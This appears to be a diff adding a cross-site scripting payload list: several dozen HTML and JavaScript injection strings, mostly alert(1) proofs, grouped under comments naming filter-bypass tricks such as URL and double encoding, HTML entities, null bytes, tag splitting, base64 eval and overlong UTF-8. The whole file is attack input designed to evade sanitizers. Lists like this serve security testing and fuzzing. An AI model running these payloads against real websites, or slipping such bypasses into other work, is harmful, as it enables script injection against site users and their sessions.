@@ -1,0 +1,59 @@
+<IMG SRC=x ONERROR=alert(1)>
+<img src=x onerror=alert(1)>
+<IMG SRC=X ONERROR=ALERT(1)>
+<iMg SrC=x OnErRoR=alert(1)>
+<ScRiPt>alert(1)</sCrIpT>
+<script>alert(1)</script>
+<SCRIPT>alert(1)</SCRIPT>
+<img src=x onerror="alert(1)">
+<img src=x onerror='alert(1)'>
+<img src=x onerror=alert`1`>
+<img src=x onerror=alert(1) x=>
+<svg onload=alert(1)>
+<SVG ONLOAD=alert(1)>
+<svg/onload=alert(1)>
+<svg	onload=alert(1)>
+<svg%0aonload=alert(1)>
+<svg%0donload=alert(1)>
+<body onload=alert(1)>
+<BODY ONLOAD=alert(1)>
+<details open ontoggle=alert(1)>
+<select onfocus=alert(1) autofocus>
+<input onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<math><maction actiontype=statusline xlink:href=javascript:alert(1)>click
+<table><td background=javascript:alert(1)>
+jaVaScRiPt:alert(1)
+javascript:alert(1)
+javascript&#58;alert(1)
+&#106;avascript:alert(1)
+# URL-encoded filter bypass
+%3cscript%3ealert(1)%3c%2fscript%3e
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+%253cscript%253ealert(1)%253c%252fscript%253e
+%3cimg+src%3dx+onerror%3dalert(1)%3e
+# Double encoded
+%253cimg+src%253dx+onerror%253dalert(1)%253e
+# HTML entity variants
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+&#60;script&#62;alert(1)&#60;/script&#62;
+&lt;script&gt;alert(1)&lt;/script&gt;
+# NULL byte bypass
+<scr\x00ipt>alert(1)</scr\x00ipt>
+<scr%00ipt>alert(1)</scr%00ipt>
+<s%00c%00r%00i%00p%00t>alert(1)</s%00c%00r%00i%00p%00t>
+# Tag splitting
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<<script>alert(1)<</script>/script>
+# Nested encoding
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+# Unicode/fullwidth bypass
+<ｓｃｒｉｐｔ>alert(1)</ｓｃｒｉｐｔ>
+# Wbr tag bypass
+<s<!-- -->cript>alert(1)</script>
+# Overlong UTF-8
+%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE
